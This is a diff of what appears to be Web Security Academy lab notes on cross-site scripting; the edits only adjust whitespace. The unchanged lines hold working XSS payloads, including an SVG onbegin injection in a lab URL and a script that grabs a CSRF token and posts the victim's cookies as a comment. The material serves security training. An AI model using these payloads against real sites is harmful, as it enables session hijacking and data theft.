@@ -84,9 +84,9 @@ javascript:alert(document.cookie)
 ```http
 https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
 ```
-	
-	which URL-decoded corresponds to:
-	
+
+which URL-decoded corresponds to:
+
 ```html
 https://YOUR-LAB-ID.web-security-academy.net/?search="><svg><animatetransform onbegin=alert(1)>
 ```
@@ -126,7 +126,7 @@ ${alert(1)}
 window.onload = () => {
 const csrf = document.getElementsByTagName('form')[0].getElementsByTagName('input')[0].value;
 
-    fetch('https://0a9900d5042125be80f9ccc7009a0036.web-security-academy.net/post/comment', {
+fetch('https://0a9900d5042125be80f9ccc7009a0036.web-security-academy.net/post/comment', {
     method: 'POST',
     body: `csrf=${csrf}&postId=4&comment=${document.cookie}&name=foo&email=foo@example.com&website=`,  
     });  
